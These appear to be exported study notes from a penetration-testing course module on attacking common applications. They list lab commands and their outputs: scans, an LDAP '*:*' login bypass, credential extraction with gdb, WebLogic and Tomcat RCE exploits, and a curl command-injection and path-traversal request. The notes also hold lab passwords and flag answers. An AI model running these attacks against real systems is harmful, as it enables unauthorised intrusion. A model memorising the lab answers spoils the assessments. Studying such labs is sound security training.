---
tags: [CWES, XMind, output, xmind-output]
source_file: CWES.xmind
source_sheet: "2"
module: "Attacking Common Applications"
output_topics: 42
---

# Attacking Common Applications — Outputs 151–192

> [!info] Yellow XMind topic semantics
> The author uses yellow topics to represent **outputs**. Every entry below corresponds to one yellow source topic and retains its XMind topic ID in a hidden validation marker.

Return to [[Outputs/Modules/Attacking Common Applications Outputs|Attacking Common Applications output index]].

## Outputs

> [!output]+ 🟨 Output 151
> 80/tcp open  http    Microsoft IIS httpd 7.5
>
> **Source path:** Attacking Common Applications → Part 3 → IIS Tilde Enumeration → Enumeration → Nmap - Open ports → nmap -p- -sV -sC --open 10.129.224.91 → 80/tcp open  http    Microsoft IIS httpd 7.5
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 94114322-82cc-4a17-8222-1607ac59f8dc -->

> [!output]+ 🟨 Output 152
> |_ Identified directories: 2
>     |_ ASPNET~1
>     |_ UPLOAD~1
>
> **Source path:** Attacking Common Applications → Part 3 → IIS Tilde Enumeration → Enumeration → Tilde Enumeration using IIS ShortName Scanner → IIS-ShortName-Scanner → java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/ → Do you want to use proxy [Y=Yes, Anything Else=No]? → |_ Identified directories: 2      |_ ASPNET~1      |_ UPLOAD~1
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 22e7296d-b5d4-4884-8251-af6e0fb5907d -->

> [!output]+ 🟨 Output 153
> /transf**.aspx
>
> **Source path:** Attacking Common Applications → Part 3 → IIS Tilde Enumeration → Enumeration → Gobuster Enumeration → gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp → /transf**.aspx
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: b5676058-21e4-4704-bf0f-d29e272b778e -->

> [!output]+ 🟨 Output 154
> /transfer.aspx
>
> **Source path:** Attacking Common Applications → Part 3 → IIS Tilde Enumeration → LAB → What is the full .aspx filename that Gobuster identified? → egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' &gt; /tmp/list.txt → gobuster dir -u http://10.129.1.15/ -w /tmp/list.txt -x .aspx,.asp → /transfer.aspx
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 722d297f-e7bc-4591-88d7-9746e0caa35a -->

> [!output]+ 🟨 Output 155
> dn: uid=jdoe,ou=people,dc=example,dc=com
> objectClass: inetOrgPerson
> objectClass: organizationalPerson
> objectClass: person
> objectClass: top
> cn: John Doe
> sn: Doe
> uid: jdoe
> mail: john.doe@example.com
>
> **Source path:** Attacking Common Applications → Part 3 → LDAP → ldapsearch → ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)" → dn: uid=jdoe,ou=people,dc=example,dc=com  objectClass: inetOrgPerson  objectClass: organizationalPerson  objectClass: person  objectClass: top  cn: John Doe  sn: Doe  uid: jdoe  mail: john.doe@example.com
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: b3c3fcea-11f3-4ea6-a24b-49f714c55ef8 -->

> [!output]+ 🟨 Output 156
> 80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
> 389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
>
> **Source path:** Attacking Common Applications → Part 3 → LDAP → Enumeration → nmap -p- -sC -sV --open --min-rate=1000 10.129.204.229 → 80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu)) 389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 6eb0a413-4afe-4ba9-816c-d5356d06038f -->

> [!output]+ 🟨 Output 157
> Powered by w3.css
>
> **Source path:** Attacking Common Applications → Part 3 → LDAP → LAB → After bypassing the login, what is the website "Powered by"? → Login with *:* → Powered by w3.css
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 045c3291-999a-4aef-9546-d34fa8268053 -->

> [!output]+ 🟨 Output 158
> ssh root@10.129.205.15
> password:!x4;EW[ZLwmDx?=w
>
> **Source path:** Attacking Common Applications → Part 3 → Web Mass Assignment Vulnerabilities → LAB → We placed the source code of the application we just covered at /opt/asset-manager/app.py inside this exercise's target, but we changed the crucial parameter's name. SSH into the target, view the source code and enter the parameter name that needs to be manipulated to log in to the Asset Manager web application. → ssh root@10.129.205.15 password:!x4;EW[ZLwmDx?=w
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 2eb15b22-bf1e-4f80-88a2-01c63814f00e -->

> [!output]+ 🟨 Output 159
> ...
> if request.form['active']:
> ...
>
> **Source path:** Attacking Common Applications → Part 3 → Web Mass Assignment Vulnerabilities → LAB → We placed the source code of the application we just covered at /opt/asset-manager/app.py inside this exercise's target, but we changed the crucial parameter's name. SSH into the target, view the source code and enter the parameter name that needs to be manipulated to log in to the Asset Manager web application. → ssh root@10.129.205.15 password:!x4;EW[ZLwmDx?=w → cat /opt/asset-manager/app.py → ... if request.form['active']: ...
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: fa7d3cef-3a98-4270-a6c9-c0a11dc0b41d -->

> [!output]+ 🟨 Output 160
> 22/tcp   open  ssh
> 3000/tcp open  ppp
>
> **Source path:** Attacking Common Applications → Part 3 → Web Mass Assignment Vulnerabilities → LAB → We placed the source code of the application we just covered at /opt/asset-manager/app.py inside this exercise's target, but we changed the crucial parameter's name. SSH into the target, view the source code and enter the parameter name that needs to be manipulated to log in to the Asset Manager web application. → nmap 10.129.205.15 → 22/tcp   open  ssh 3000/tcp open  ppp
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: d8a4d0ed-f1da-4fe7-88e8-ec22995aa008 -->

> [!output]+ 🟨 Output 161
> gdb-peda$
>
> **Source path:** Attacking Common Applications → Part 3 → Attacking Applications Connecting to Services → ELF Executable Examination → gdb ./octopus_checker → Once the binary is loaded, → set the disassembly-flavor to define the display style of the code → gdb-peda$
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 898d797b-ce47-4b7b-8a96-61571afa6b4b -->

> [!output]+ 🟨 Output 162
> 0x00005555555555ff &lt;+425&gt;:	     mov    esi,0x0
> 0x0000555555555604 &lt;+430&gt;:	mov    rdi,rax
> 0x0000555555555607 &lt;+433&gt;:	call   0x5555555551b0 &lt;SQLDriverConnect@plt&gt;
> 0x000055555555560c &lt;+438&gt;:	add    rsp,0x10
> 0x0000555555555610 &lt;+442&gt;:	mov    WORD PTR [rbp-0x4b4],ax
>
> **Source path:** Attacking Common Applications → Part 3 → Attacking Applications Connecting to Services → ELF Executable Examination → gdb ./octopus_checker → Once the binary is loaded, → set the disassembly-flavor to define the display style of the code → gdb-peda$ → set disassembly-flavor intel → disas main → 0x00005555555555ff &lt;+425&gt;:	     mov    esi,0x0 0x0000555555555604 &lt;+430&gt;:	mov    rdi,rax 0x0000555555555607 &lt;+433&gt;:	call   0x5555555551b0 &lt;SQLDriverConnect@plt&gt; 0x000055555555560c &lt;+438&gt;:	add    rsp,0x10 0x0000555555555610 &lt;+442&gt;:	mov    WORD PTR [rbp-0x4b4],ax
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: e464bd2f-2666-42f1-b03d-a9f5425aaac2 -->

> [!output]+ 🟨 Output 163
> Breakpoint 1 at 0x5555555551b0
>
> **Source path:** Attacking Common Applications → Part 3 → Attacking Applications Connecting to Services → ELF Executable Examination → gdb ./octopus_checker → Adding a breakpoint at this address and running the program once again → b *0x5555555551b0 → Breakpoint 1 at 0x5555555551b0
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 07dc8e3d-c4c8-4574-98b8-7e34983ffa7a -->

> [!output]+ 🟨 Output 164
> RDX: 0x7fffffffda70 ("DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=username;PWD=password;")
>
> **Source path:** Attacking Common Applications → Part 3 → Attacking Applications Connecting to Services → ELF Executable Examination → gdb ./octopus_checker → Adding a breakpoint at this address and running the program once again → b *0x5555555551b0 → Breakpoint 1 at 0x5555555551b0 → run → RDX: 0x7fffffffda70 ("DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=username;PWD=password;")
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 9b9a3625-094e-4e94-b757-3dde944c9b31 -->

> [!output]+ 🟨 Output 165
> PSH&gt; Get-FileMetaData .\MultimasterAPI.dll
>
> **Source path:** Attacking Common Applications → Part 3 → Attacking Applications Connecting to Services → DLL File Examination → The MultimasterAPI.dll binary is found on a remote machine → Examination of the file reveals that this is a .Net assembly. → PSH&gt; Get-FileMetaData .\MultimasterAPI.dll
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: ec905540-c29d-4177-91c9-57fc91afe035 -->

> [!output]+ 🟨 Output 166
> M 
> .NETFramework...
>
> **Source path:** Attacking Common Applications → Part 3 → Attacking Applications Connecting to Services → DLL File Examination → The MultimasterAPI.dll binary is found on a remote machine → Examination of the file reveals that this is a .Net assembly. → PSH&gt; Get-FileMetaData .\MultimasterAPI.dll → M .NETFramework...
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 6331be62-e631-4427-a652-c670b5ce370b -->

> [!output]+ 🟨 Output 167
> database connection string containing the password.
>
> **Source path:** Attacking Common Applications → Part 3 → Attacking Applications Connecting to Services → DLL File Examination → The MultimasterAPI.dll binary is found on a remote machine → Examination of the file reveals that this is a .Net assembly. → Using the debugger and .NET assembly editor dnSpy → This tool allows reading, editing, and debugging the source code of a .NET assembly → MultimasterAPI.Controllers -&gt; ColleagueController → database connection string containing the password.
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: af52a8eb-ed61-40b0-bf38-bcf60fc07b12 -->

> [!output]+ 🟨 Output 168
> ssh htb-student@10.129.205.20
> password:HTB_@cademy_stdnt!
>
> **Source path:** Attacking Common Applications → Part 3 → Attacking Applications Connecting to Services → LAB → What credentials were found for the local database instance while debugging the octopus_checker binary? (Format username:password) → ssh htb-student@10.129.205.20 password:HTB_@cademy_stdnt!
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 03c5d8f3-c950-439c-89ce-d47ff7a11f49 -->

> [!output]+ 🟨 Output 169
> RDX: 0x7fffffffdf30 ("DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=SA;PWD=N0tS3cr3t!;")
>
> **Source path:** Attacking Common Applications → Part 3 → Attacking Applications Connecting to Services → LAB → What credentials were found for the local database instance while debugging the octopus_checker binary? (Format username:password) → ssh htb-student@10.129.205.20 password:HTB_@cademy_stdnt! → gdb ./octopus_checker → set disassembly-flavor intel → disas main → c → break SQLDriverConnect → starti → continue → delete → break SQLDriverConnect → run → RDX: 0x7fffffffdf30 ("DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=SA;PWD=N0tS3cr3t!;")
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 801d05cf-c574-45a4-a77b-f4d1d0ec672a -->

> [!output]+ 🟨 Output 170
> 21/tcp    open  ftp
> | ftp-anon: Anonymous FTP login allowed (FTP code 230)
> | 09-07-20  04:51PM       &lt;DIR&gt;          aspnet_client
> | 09-07-20  04:49PM                99710 iisstart.png
> |_09-07-20  07:13PM                  218 web.config
> | ftp-syst: 
> |_  SYST: Windows_NT
> 80/tcp    open  http
> |_http-title: 10.129.201.102 - /
> | http-methods: 
> |_  Potentially risky methods: TRACE
> 135/tcp   open  msrpc
> 139/tcp   open  netbios-ssn
> 443/tcp   open  https
> | ssl-cert: Subject: commonName=MS01
> | Not valid before: 2020-09-06T23:51:02
> |_Not valid after:  2021-03-08T23:51:02
> |_ssl-date: 2026-06-19T14:48:30+00:00; -1s from scanner time.
> | http-methods: 
> |_  Potentially risky methods: TRACE
> |_http-title: 10.129.201.102 - /
> | tls-alpn: 
> |   h2
> |_  http/1.1
> 445/tcp   open  microsoft-ds
> 5985/tcp  open  wsman
> 7001/tcp  open  afs3-callback
> |_weblogic-t3-info: T3 protocol in use (WebLogic version: 12.2.1.3)
> 47001/tcp open  winrm
> 49664/tcp open  unknown
> 49665/tcp open  unknown
> 49666/tcp open  unknown
> 49667/tcp open  unknown
> 49668/tcp open  unknown
> 49669/tcp open  unknown
> 49670/tcp open  unknown
>
> **Source path:** Attacking Common Applications → Part 3 → Other Notable Applications → LAB → Enumerate the target host and identify the running application. What application is running? → nmap 10.129.201.102 -p- -sC → 21/tcp    open  ftp | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 09-07-20  04:51PM       &lt;DIR&gt;          aspnet_client | 09-07-20  04:49PM                99710 iisstart.png |_09-07-20  07:13PM                  218 web.config | ftp-syst:  |_  SYST: Windows_NT 80/tcp    open  http |_http-title: 10.129.201.102 - / | http-methods:  |_  Potentially risky methods: TRACE 135/tcp   open  msrpc 139/tcp   open  netbios-ssn 443/tcp   open  https | ssl-cert: Subject: commonName=MS01 | Not valid before: 2020-09-06T23:51:02 |_Not valid after:  2021-03-08T23:51:02 |_ssl-date: 2026-06-19T14:48:30+00:00; -1s from scanner time. | http-methods:  |_  Potentially risky methods: TRACE |_http-title: 10.129.201.102 - / | tls-alpn:  |   h2 |_  http/1.1 445/tcp   open  microsoft-ds 5985/tcp  open  wsman 7001/tcp  open  afs3-callback |_weblogic-t3-info: T3 protocol in use (WebLogic version: 12.2.1.3) 47001/tcp open  winrm 49664/tcp open  unknown 49665/tcp open  unknown 49666/tcp open  unknown 49667/tcp open  unknown 49668/tcp open  unknown 49669/tcp open  unknown 49670/tcp open  unknown
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 39d07c82-4e66-4590-9cf4-73836b6da644 -->

> [!output]+ 🟨 Output 171
> Oracle WebLogic Server 12.2.1.0 - RCE (Unauthenticated)          | java/webapps/49479.py
>
> **Source path:** Attacking Common Applications → Part 3 → Other Notable Applications → LAB → Enumerate the application for vulnerabilities. Gain remote code execution and submit the contents of the flag.txt file on the administrator desktop. → searchsploit weblogic → Oracle WebLogic Server 12.2.1.0 - RCE (Unauthenticated)          | java/webapps/49479.py
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 960ccec6-31ef-46b4-b0c0-6fbec747a6db -->

> [!output]+ 🟨 Output 172
> (CHackA0101GNU/Linux)$
>
> **Source path:** Attacking Common Applications → Part 3 → Other Notable Applications → LAB → Enumerate the application for vulnerabilities. Gain remote code execution and submit the contents of the flag.txt file on the administrator desktop. → searchsploit weblogic → Oracle WebLogic Server 12.2.1.0 - RCE (Unauthenticated)          | java/webapps/49479.py → searchsploit -m 49479 → python 49479.py -u http://10.129.201.102:7001 → (CHackA0101GNU/Linux)$
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: bfcf26ee-5c08-4b62-ba45-721a5fd9ae6f -->

> [!output]+ 🟨 Output 173
> &lt;TITLE&gt;Error 404--Not Found&lt;/TITLE&gt;
>
> **Source path:** Attacking Common Applications → Part 3 → Other Notable Applications → LAB → Enumerate the application for vulnerabilities. Gain remote code execution and submit the contents of the flag.txt file on the administrator desktop. → searchsploit weblogic → Oracle WebLogic Server 12.2.1.0 - RCE (Unauthenticated)          | java/webapps/49479.py → searchsploit -m 49479 → python 49479.py -u http://10.129.201.102:7001 → (CHackA0101GNU/Linux)$ → ls → &lt;TITLE&gt;Error 404--Not Found&lt;/TITLE&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 3f56305e-c47a-43c7-927a-7d96982aee76 -->

> [!output]+ 🟨 Output 174
> w3b_l0gic_RCE!
>
> **Source path:** Attacking Common Applications → Part 3 → Other Notable Applications → LAB → Enumerate the application for vulnerabilities. Gain remote code execution and submit the contents of the flag.txt file on the administrator desktop. → searchsploit weblogic → Oracle WebLogic Server 12.2.1.0 - RCE (Unauthenticated)          | java/webapps/49479.py → searchsploit -m 49479 → python 49479.py -u http://10.129.201.102:7001 → (CHackA0101GNU/Linux)$ → type c:\users\administrator\desktop\flag.txt → w3b_l0gic_RCE!
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: b312e4c4-15ce-4381-8789-c17524c69db7 -->

> [!output]+ 🟨 Output 175
> 21/tcp    open  ftp
> | ftp-syst: 
> |_  SYST: Windows_NT
> | ftp-anon: Anonymous FTP login allowed (FTP code 230)
> |_09-01-21  08:07AM       &lt;DIR&gt;          website_backup
> 80/tcp    open  http
> |_http-title: Freight Logistics, Inc
> | http-methods: 
> |_  Potentially risky methods: TRACE
> 135/tcp   open  msrpc
> 139/tcp   open  netbios-ssn
> 445/tcp   open  microsoft-ds
> 3389/tcp  open  ms-wbt-server
> |_ssl-date: 2026-06-19T16:24:09+00:00; +1h00m00s from scanner time.
> | rdp-ntlm-info: 
> |   Target_Name: APPS-SKILLS1
> |   NetBIOS_Domain_Name: APPS-SKILLS1
> |   NetBIOS_Computer_Name: APPS-SKILLS1
> |   DNS_Domain_Name: APPS-SKILLS1
> |   DNS_Computer_Name: APPS-SKILLS1
> |   Product_Version: 10.0.17763
> |_  System_Time: 2026-06-19T16:24:09+00:00
> | ssl-cert: Subject: commonName=APPS-SKILLS1
> | Not valid before: 2026-06-18T16:22:33
> |_Not valid after:  2026-12-18T16:22:33
> 5985/tcp  open  wsman
> 8000/tcp  open  http-alt
> | http-robots.txt: 1 disallowed entry 
> |_/
> |_http-title: Site doesn't have a title (text/html;charset=utf-8).
> 8009/tcp  open  ajp13
> |_ajp-methods: Failed to get a valid response for the OPTION request
> 8080/tcp  open  http-proxy
> |_http-title: Apache Tomcat/9.0.0.M1
> |_http-favicon: Apache Tomcat
> 47001/tcp open  winrm
> 49664/tcp open  unknown
> 49665/tcp open  unknown
> 49666/tcp open  unknown
> 49667/tcp open  unknown
> 49668/tcp open  unknown
> 49669/tcp open  unknown
> 49670/tcp open  unknown
> 49671/tcp open  unknown
>
> Host script results:
> | smb2-security-mode: 
> |   3:1:1: 
> |_    Message signing enabled but not required
> | smb2-time: 
> |   date: 2026-06-19T16:24:11
> |_  start_date: N/A
> |_clock-skew: mean: 1h00m00s, deviation: 0s, median: 1h00m00s
>
> **Source path:** Attacking Common Applications → Part 3 → Skills Assessment I → What vulnerable application is running? → nmap -sC -p- 10.129.1.16 → 21/tcp    open  ftp | ftp-syst:  |_  SYST: Windows_NT | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_09-01-21  08:07AM       &lt;DIR&gt;          website_backup 80/tcp    open  http |_http-title: Freight Logistics, Inc | http-methods:  |_  Potentially risky methods: TRACE 135/tcp   open  msrpc 139/tcp   open  netbios-ssn 445/tcp   open  microsoft-ds 3389/tcp  open  ms-wbt-server |_ssl-date: 2026-06-19T16:24:09+00:00; +1h00m00s from scanner time. | rdp-ntlm-info:  |   Target_Name: APPS-SKILLS1 |   NetBIOS_Domain_Name: APPS-SKILLS1 |   NetBIOS_Computer_Name: APPS-SKILLS1 |   DNS_Domain_Name: APPS-SKILLS1 |   DNS_Computer_Name: APPS-SKILLS1 |   Product_Version: 10.0.17763 |_  System_Time: 2026-06-19T16:24:09+00:00 | ssl-cert: Subject: commonName=APPS-SKILLS1 | Not valid before: 2026-06-18T16:22:33 |_Not valid after:  2026-12-18T16:22:33 5985/tcp  open  wsman 8000/tcp  open  http-alt | http-robots.txt: 1 disallowed entry  |_/ |_http-title: Site doesn't have a title (text/html;charset=utf-8). 8009/tcp  open  ajp13 |_ajp-methods: Failed to get a valid response for the OPTION request 8080/tcp  open  http-proxy |_http-title: Apache Tomcat/9.0.0.M1 |_http-favicon: Apache Tomcat 47001/tcp open  winrm 49664/tcp open  unknown 49665/tcp open  unknown 49666/tcp open  unknown 49667/tcp open  unknown 49668/tcp open  unknown 49669/tcp open  unknown 49670/tcp open  unknown 49671/tcp open  unknown  Host script results: | smb2-security-mode:  |   3:1:1:  |_    Message signing enabled but not required | smb2-time:  |   date: 2026-06-19T16:24:11 |_  start_date: N/A |_clock-skew: mean: 1h00m00s, deviation: 0s, median: 1h00m00s
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 6ee59141-8aed-41ec-8a11-11710dff4a48 -->

> [!output]+ 🟨 Output 176
> /docs                 (Status: 302) [Size: 0] [--&gt; http://10.129.1.16:8080/docs/]
> /examples             (Status: 302) [Size: 0] [--&gt; http://10.129.1.16:8080/examples/]
> /http%3A%2F%2Fwww     (Status: 400) [Size: 0]
> /http%3A%2F%2Fyoutube (Status: 400) [Size: 0]
> /http%3A%2F%2Fblogs   (Status: 400) [Size: 0]
> /http%3A%2F%2Fblog    (Status: 400) [Size: 0]
> /**http%3A%2F%2Fwww   (Status: 400) [Size: 0]
>
> **Source path:** Attacking Common Applications → Part 3 → Skills Assessment I → Exploit the application to obtain a shell and submit the contents of the flag.txt file on the Administrator desktop. → gobuster dir -u http://10.129.1.16:8080/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt → /docs                 (Status: 302) [Size: 0] [--&gt; http://10.129.1.16:8080/docs/] /examples             (Status: 302) [Size: 0] [--&gt; http://10.129.1.16:8080/examples/] /http%3A%2F%2Fwww     (Status: 400) [Size: 0] /http%3A%2F%2Fyoutube (Status: 400) [Size: 0] /http%3A%2F%2Fblogs   (Status: 400) [Size: 0] /http%3A%2F%2Fblog    (Status: 400) [Size: 0] /**http%3A%2F%2Fwww   (Status: 400) [Size: 0]
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 2e930b3a-97bc-4b36-bddf-e98a75be47b5 -->

> [!output]+ 🟨 Output 177
> Welcome to Jenkins!
>
> **Source path:** Attacking Common Applications → Part 3 → Skills Assessment I → Exploit the application to obtain a shell and submit the contents of the flag.txt file on the Administrator desktop. → visit:8000 → Welcome to Jenkins!
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: b52d506d-8cab-4442-ac3d-82b2c1f477b2 -->

> [!output]+ 🟨 Output 178
> cmd.bat
>
> **Source path:** Attacking Common Applications → Part 3 → Skills Assessment I → Exploit the application to obtain a shell and submit the contents of the flag.txt file on the Administrator desktop. → ffuf -u http://10.129.1.17:8080/cgi/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .bat,.md -ic → cmd.bat
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: a4f4ba14-413c-428e-beb4-24cf701c18aa -->

> [!output]+ 🟨 Output 179
> flag.txt
>
> **Source path:** Attacking Common Applications → Part 3 → Skills Assessment I → Exploit the application to obtain a shell and submit the contents of the flag.txt file on the Administrator desktop. → ffuf -u http://10.129.1.17:8080/cgi/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .bat,.md -ic → cmd.bat → curl 'http://10.129.1.17:8080/cgi/cmd.bat?&amp;dir' → curl 'http://10.129.1.17:8080/cgi/cmd.bat?&amp;dir..%5C..%5C..%5C..%5C..%5C..%5C..%5CUsers%5CAdministrator%5CDesktop%5Cflag.txt' → flag.txt
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 55e67bad-3a15-46ab-915e-077747cd6e70 -->

> [!output]+ 🟨 Output 180
> Meterpreter 1&gt;
>
> **Source path:** Attacking Common Applications → Part 3 → Skills Assessment I → Exploit the application to obtain a shell and submit the contents of the flag.txt file on the Administrator desktop. → ffuf -u http://10.129.1.17:8080/cgi/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .bat,.md -ic → MSF → windows/http/tomcat_cgi_cmdlineargs → run → Meterpreter 1&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 73ee10d2-7db6-439a-8972-3f9af7c5cea9 -->

> [!output]+ 🟨 Output 181
> f55763d31a8f63ec935abd07aee5d3d0
>
> **Source path:** Attacking Common Applications → Part 3 → Skills Assessment I → Exploit the application to obtain a shell and submit the contents of the flag.txt file on the Administrator desktop. → ffuf -u http://10.129.1.17:8080/cgi/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .bat,.md -ic → MSF → windows/http/tomcat_cgi_cmdlineargs → run → Meterpreter 1&gt; → cat /users/administrator/desktop/flag.txt → f55763d31a8f63ec935abd07aee5d3d0
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 1880e067-75ff-4745-989c-13b19637d39f -->

> [!output]+ 🟨 Output 182
> 22/tcp   open  ssh
> | ssh-hostkey: 
> |   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
> |   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
> |_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
> 25/tcp   open  smtp
> |_smtp-commands: skills2, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
> 80/tcp   open  http
> |_http-title: Did not follow redirect to http://gitlab.inlanefreight.local:8180/
> 389/tcp  open  ldap
> 443/tcp  open  https
> | ssl-cert: Subject: commonName=10.129.201.90/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US
> | Not valid before: 2021-09-02T01:49:48
> |_Not valid after:  2031-08-31T01:49:48
> | tls-alpn: 
> |_  http/1.1
> |_ssl-date: TLS randomness does not represent time
> |_http-title:  Shipter\xE2\x80\x93Transport and Logistics HTML5 Template 
> 5667/tcp open  unknown
> 8060/tcp open  aero
> 8180/tcp open  unknown
> | http-title: Sign in \xC2\xB7 GitLab
> |_Requested resource was http://gitlab.inlanefreight.local:8180/users/sign_in
> | http-robots.txt: 54 disallowed entries (15 shown)
> | / /autocomplete/users /autocomplete/projects /search 
> | /admin /profile /dashboard /users /help /s/ /-/profile /-/ide/ 
> |_/*/new /*/edit /*/raw
> 9094/tcp open  unknown
>
> **Source path:** Attacking Common Applications → Part 3 → Skills Assessment II → What is the URL of the WordPress instance? → nmap -p- -sC gitlab.inlanefreight.local → 22/tcp   open  ssh | ssh-hostkey:  |   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA) |   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA) |_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519) 25/tcp   open  smtp |_smtp-commands: skills2, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING 80/tcp   open  http |_http-title: Did not follow redirect to http://gitlab.inlanefreight.local:8180/ 389/tcp  open  ldap 443/tcp  open  https | ssl-cert: Subject: commonName=10.129.201.90/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US | Not valid before: 2021-09-02T01:49:48 |_Not valid after:  2031-08-31T01:49:48 | tls-alpn:  |_  http/1.1 |_ssl-date: TLS randomness does not represent time |_http-title:  Shipter\xE2\x80\x93Transport and Logistics HTML5 Template  5667/tcp open  unknown 8060/tcp open  aero 8180/tcp open  unknown | http-title: Sign in \xC2\xB7 GitLab |_Requested resource was http://gitlab.inlanefreight.local:8180/users/sign_in | http-robots.txt: 54 disallowed entries (15 shown) | / /autocomplete/users /autocomplete/projects /search  | /admin /profile /dashboard /users /help /s/ /-/profile /-/ide/  |_/*/new /*/edit /*/raw 9094/tcp open  unknown
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: e8c04379-35e4-443b-8257-44dc421b482f -->

> [!output]+ 🟨 Output 183
> blog
> monitoring
> gitlab
>
> **Source path:** Attacking Common Applications → Part 3 → Skills Assessment II → What is the URL of the WordPress instance? → ffuf -u http://10.129.201.90 -H "Host: FUZZ.inlanefreight.local"  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt  -fs 46166 → blog monitoring gitlab
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 79129d69-b9d4-4b56-8552-514839607bc2 -->

> [!output]+ 🟨 Output 184
> Name 	Last commit 	Last update
> .gitignore 	Ignoring backup files 	17 years ago
> INSTALL 	Update INSTALL with master password 	4 years ago
> README 	Make README a bit more legible 	19 years ago
> check_pg_connections.pl 	Trapping execute error for curr_conn and reporting that error. 	17 years ago
> check_pg_lock_status.pl 	Initial Checkin of Code. 	19 years ago
> check_pg_max_xid.pl 	Initial Checkin of Code. 	19 years ago
> check_pg_queries.pl 	Added an INSTALL file since there were a number of assumptions I was making about the system. 	19 years ago
> check_pg_time.pl 	Initial Checkin of Code. 	19 years ago
> check_pg_waiting_queries.pl 	clean up some perl warnings, still not 100% though 	19 years ago
> pg_stat_activity.sql 	Added an INSTALL file since there were a number of assumptions I was making about the system. 	19 years ago
>
> **Source path:** Attacking Common Applications → Part 3 → Skills Assessment II → What is the admin password to access this application? → look in Nagios project in gitlab → Name 	Last commit 	Last update .gitignore 	Ignoring backup files 	17 years ago INSTALL 	Update INSTALL with master password 	4 years ago README 	Make README a bit more legible 	19 years ago check_pg_connections.pl 	Trapping execute error for curr_conn and reporting that error. 	17 years ago check_pg_lock_status.pl 	Initial Checkin of Code. 	19 years ago check_pg_max_xid.pl 	Initial Checkin of Code. 	19 years ago check_pg_queries.pl 	Added an INSTALL file since there were a number of assumptions I was making about the system. 	19 years ago check_pg_time.pl 	Initial Checkin of Code. 	19 years ago check_pg_waiting_queries.pl 	clean up some perl warnings, still not 100% though 	19 years ago pg_stat_activity.sql 	Added an INSTALL file since there were a number of assumptions I was making about the system. 	19 years ago
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 1ea5e94a-7d4b-41f1-b774-07b1070ce08d -->

> [!output]+ 🟨 Output 185
> postgres=# CREATE USER nagiosadmin WITH PASSWORD 'oilaKglm7M09@CPL&amp;^lC';
> CREATE USER
>
